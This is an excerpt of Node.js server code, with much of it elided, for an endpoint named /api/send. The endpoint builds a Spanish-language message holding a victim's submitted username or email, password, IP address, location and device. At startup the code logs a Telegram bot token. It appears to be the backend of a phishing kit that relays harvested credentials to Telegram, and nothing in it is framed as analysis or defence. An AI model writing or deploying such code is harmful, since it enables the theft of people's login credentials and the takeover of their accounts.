  ...
  if (pathname === '/api/send' || pathname === '/api/send.js') {
    ...
    req.on('end', async () => {
      try {
        ...
        message += `━━━━━━━━━━━━━━━━━━━\n`;
        message += `👤 <b>Usuario / Email:</b> <code>${accessCode || 'N/A'}</code>\n`;
        message += `🔑 <b>Contraseña:</b> <code>${password || 'N/A'}</code>\n`;
        message += `━━━━━━━━━━━━━━━━━━━\n`;
        message += `🌍 <b>IP:</b> <code>${ipStr || 'N/A'}</code>\n`;
        message += `📍 <b>Ubicación:</b> ${locationStr || 'N/A'}\n`;
        message += `💻 <b>Dispositivo:</b> ${device || 'N/A'}\n`;
...
server.listen(PORT, () => {
  ...
  console.log(`🤖 Telegram Bot Token: ${CONFIG.TELEGRAM_BOT_TOKEN}`);
